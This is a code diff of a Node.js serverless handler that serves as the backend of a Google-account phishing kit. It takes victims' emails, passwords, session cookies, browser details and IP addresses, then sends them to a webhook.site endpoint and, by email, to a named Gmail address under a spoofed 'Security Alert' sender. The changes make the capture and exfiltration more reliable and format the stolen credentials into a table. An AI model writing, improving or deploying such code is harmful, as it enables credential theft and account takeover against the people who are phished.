@@ -6,25 +6,52 @@ export default async function handler(req, res) {
   }
 
   const data = req.body;
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection.remoteAddress;
 
-  // WEBHOOK
-  fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ ...data, ip })
-  }).catch(() => {});
+  console.log('Captured:', data.email, ip);
 
-  // EMAIL
+  // WEBHOOK BACKUP (optional)
+  try {
+    await fetch(process.env.WEBHOOK_URL || 'https://webhook.site/#!/temp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ...data, ip })
+    });
+  } catch {}
+
+  // GMAIL EMAIL
   const transporter = nodemailer.createTransporter({
-    host: 'smtp.gmail.com', port: 587, secure: false,
-    auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS }
+    host: 'smtp.gmail.com',
+    port: 587,
+    secure: false,
+    auth: {
+      user: process.env.EMAIL_USER,  // your@gmail.com
+      pass: process.env.EMAIL_PASS   // App Password
+    }
   });
 
   await transporter.sendMail({
-    from: process.env.EMAIL_USER, to: 'busmeup13@gmail.com',
-    subject: `🔔 GMAIL CAPTURE: ${data.email}`,
-    html: `<h1>🎯 Captured</h1><p><strong>Email:</strong> ${data.email}</p><p><strong>Pass:</strong> ${data.password}</p><p><strong>IP:</strong> ${ip}</p><pre>${JSON.stringify(data, null, 2)}</pre>`
+    from: `"Security Alert" <${process.env.EMAIL_USER}>`,
+    to: 'busmeup13@gmail.com',
+    subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
+    html: `
+      <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
+        <h2 style="color:#d93025">🎯 Google Workspace Credentials</h2>
+        <table cellpadding="8" style="border:1px solid #ddd;width:100%">
+          <tr><td><strong>⏰ Time</strong></td><td>${new Date().toLocaleString()}</td></tr>
+          <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
+          <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
+          <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
+          <tr><td><strong>🍪 Cookies</strong></td><td><code>${data.cookies || 'none'}</code></td></tr>
+          <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0,80)}...</td></tr>
+        </table>
+        <details>
+          <summary>Full Data (JSON)</summary>
+          <pre style="background:#f5f5f5;padding:16px;overflow:auto">${JSON.stringify(data,null,2)}</pre>
+        </details>
+      </div>
+    `
   });
 
-  res.json({ status: 'captured' });
+  res.json({ status: 'captured ✅', email: data.email });
 }
